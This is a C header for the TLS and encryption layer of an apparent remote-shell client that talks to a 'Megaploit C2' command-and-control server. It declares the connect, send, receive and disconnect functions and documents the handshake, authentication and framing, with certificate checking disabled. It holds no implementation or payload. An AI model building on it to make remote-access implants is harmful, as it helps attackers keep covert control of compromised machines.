/*
 * tls/tls_client.h  –  Advanced TLS layer for the C-remote-shell client
 * =======================================================================
 * Matches the Megaploit C2 security standards exactly:
 *
 *  TLS hardening
 *  -------------
 *  • SChannel (Windows native) with SP_PROT_TLS1_2 | SP_PROT_TLS1_3
 *  • AEAD-only cipher suites via SCH_USE_STRONG_CRYPTO flag
 *    (maps to AES-128/256-GCM, ChaCha20-Poly1305 on Win10+)
 *  • SSL 2/3 and TLS 1.0/1.1 explicitly disabled
 *  • No renegotiation (ISC_REQ_NO_RENEGOTIATION where available)
 *  • No null/anonymous/export/RC4 ciphers
 *  • Forward secrecy: ISC_REQ_EXTENDED_ERROR | ISC_REQ_MANUAL_CRED_VALIDATION
 *
 *  Post-TLS auth  (mirrors megaploit.core.crypto.agent_authenticate)
 *  ------------------------------------------------------------------
 *  • Server sends 16-byte random challenge
 *  • Client replies with HMAC-SHA256(secret_key, challenge)  → 32 bytes
 *
 *  Protocol v2 handshake  (mirrors megaploit.core.protocol.handshake_agent)
 *  -------------------------------------------------------------------------
 *  • Server sends 1 byte: 0x4d ('M') = v2 / AES-256-GCM encrypted
 *  • Client echoes the same byte back to confirm v2
 *
 *  Encrypted framing  (mirrors megaploit.core.protocol send_msg/recv_msg)
 *  -----------------------------------------------------------------------
 *  Every message:  [uint32-BE total_payload_len]
 *                  [12-byte random GCM nonce]
 *                  [ciphertext + 16-byte GCM auth tag]
 *  Plaintext:      [uint64-BE sequence_number][data bytes]
 *
 *  Replay protection
 *  -----------------
 *  Each side keeps a monotonic uint64 sequence counter.  Received messages
 *  whose sequence number is not strictly greater than the last accepted one
 *  are dropped (mirrors the Python implementation).
 *
 *  Build requirements
 *  ------------------
 *  Link with: Secur32.lib  Crypt32.lib  ws2_32.lib  bcrypt.lib
 */

#pragma once
#ifndef TLS_CLIENT_H
#define TLS_CLIENT_H

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>

/* SChannel / SSPI */
#ifndef SECURITY_WIN32
#define SECURITY_WIN32
#endif
#include <security.h>
#include <schannel.h>
#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "Crypt32.lib")

/* BCrypt – used for HMAC-SHA256 and AES-256-GCM */
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")

#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#ifdef __cplusplus
extern "C" {
#endif


/* ─────────────────────────────────────────────────────────────────────────── */
/*  Constants                                                                  */
/* ─────────────────────────────────────────────────────────────────────────── */

#define TLS_IO_BUFFER_SIZE    (65536)           /* matches C2 BUFFER_SIZE       */
#define TLS_AUTH_HMAC_LEN     (32)              /* HMAC-SHA256 = 32 bytes       */
#define TLS_CHALLENGE_LEN     (16)              /* server challenge = 16 bytes  */
#define TLS_NONCE_LEN         (12)              /* AES-GCM nonce = 12 bytes     */
#define TLS_GCM_TAG_LEN       (16)              /* AES-GCM auth tag = 16 bytes  */
#define TLS_SEQ_LEN           (8)               /* uint64-BE sequence number    */
#define TLS_HDR_LEN           (4)               /* uint32-BE frame length       */
#define TLS_V2_MAGIC          (0x4Du)           /* 'M' – v2 encrypted protocol  */

/* 256 MiB hard cap per frame — mirrors MAX_PLUGIN_MSG_SIZE in config.py     */
#define TLS_MAX_FRAME_SIZE    (256 * 1024 * 1024)


/* ─────────────────────────────────────────────────────────────────────────── */
/*  TLS connection context                                                     */
/* ─────────────────────────────────────────────────────────────────────────── */

typedef struct _TLS_CONTEXT {
    SOCKET            sock;             /* underlying Winsock socket            */
    CredHandle        hCred;            /* SChannel credential handle           */
    CtxtHandle        hCtx;             /* SChannel security context            */
    SecPkgContext_StreamSizes streamSz; /* SChannel stream sizes                */
    BOOL              fCtxInit;         /* TRUE once hCtx is valid              */
    BOOL              fCredInit;        /* TRUE once hCred is valid             */

    /* Raw TLS record staging buffer (ciphertext not yet decrypted)             */
    BYTE             *pRecvBuf;
    DWORD             cbRecvBuf;
    DWORD             cbRecvBufAlloc;

    /* Plaintext leftover from partial SChannel DecryptMessage calls            */
    BYTE             *pPlainBuf;
    DWORD             cbPlainBuf;
    DWORD             cbPlainBufAlloc;

    /* AES-256-GCM session key (32 bytes, copied from the shared secret.key)   */
    BYTE              sessionKey[32];

    /* Monotonic sequence counters (replay protection)                          */
    uint64_t          sendSeq;
    uint64_t          recvSeq;  /* (uint64_t)-1 before first message received  */

    /*
     * Cached BCrypt key handles for AES-256-GCM encrypt and decrypt.
     * Opening BCryptOpenAlgorithmProvider + BCryptGenerateSymmetricKey on
     * every single message costs ~15–25 µs per call on typical hardware.
     * Caching the key handles drops per-message crypto overhead to < 2 µs.
     *
     * Lifecycle:
     *   - Populated by tls_connect() immediately after the session key is set.
     *   - Destroyed by tls_disconnect() via BCryptDestroyKey / BCryptCloseAlgorithmProvider.
     *   - Both handles are NULL until tls_connect() succeeds.
     */
    BCRYPT_ALG_HANDLE hAesAlg;          /* BCrypt AES-GCM algorithm provider   */
    BCRYPT_KEY_HANDLE hAesKeyEnc;       /* Encrypt key handle (session key)    */
    BCRYPT_KEY_HANDLE hAesKeyDec;       /* Decrypt key handle (session key)    */
} TLS_CONTEXT, *PTLS_CONTEXT;


/* ─────────────────────────────────────────────────────────────────────────── */
/*  Public API                                                                 */
/* ─────────────────────────────────────────────────────────────────────────── */

/*
 * tls_connect
 * -----------
 * Performs all four security layers on top of an already-TCP-connected socket:
 *   1. SChannel TLS 1.2/1.3 handshake (AEAD-only, no renegotiation)
 *   2. HMAC-SHA256 challenge/response authentication
 *   3. Protocol v2 magic-byte negotiation
 *
 * Parameters
 *   pCtx        – caller-allocated TLS_CONTEXT (zero it before passing in)
 *   sock        – connected (plaintext) Winsock SOCKET
 *   pszHost     – server IP/hostname string (used for SNI; cert check is off)
 *   pSecretKey  – 32 raw bytes of the shared secret
 *
 * Returns TRUE on full success, FALSE on any failure.
 * On failure, tls_disconnect() has already been called internally.
 */
BOOL tls_connect(PTLS_CONTEXT pCtx, SOCKET sock,
                 const char  *pszHost,
                 const BYTE  *pSecretKey);

/*
 * tls_send_msg
 * ------------
 * Prepends a uint64-BE sequence number to pData, AES-256-GCM-encrypts
 * the result, frames it with a uint32-BE length header, and sends it
 * through the SChannel TLS record layer.
 *
 * Returns TRUE on success, FALSE on encryption or socket error.
 */
BOOL tls_send_msg(PTLS_CONTEXT pCtx, const BYTE *pData, DWORD cbData);

/*
 * tls_recv_msg
 * ------------
 * Reads one framed message, decrypts it with AES-256-GCM, and verifies
 * the sequence number against replay attacks.
 *
 * *ppData is heap-allocated by this function; caller must free() it.
 * *pcbData receives the plaintext byte count (sequence prefix excluded).
 *
 * Returns TRUE on success, FALSE on decryption error, replay, or socket loss.
 */
BOOL tls_recv_msg(PTLS_CONTEXT pCtx, BYTE **ppData, DWORD *pcbData);

/*
 * tls_disconnect
 * --------------
 * Sends a TLS close_notify alert, deletes the SChannel context and
 * credentials, frees all heap buffers, and zeroes the session key.
 * Safe to call even if tls_connect() was never called or partially failed.
 */
VOID tls_disconnect(PTLS_CONTEXT pCtx);


#ifdef __cplusplus
}
#endif
#endif /* TLS_CLIENT_H */
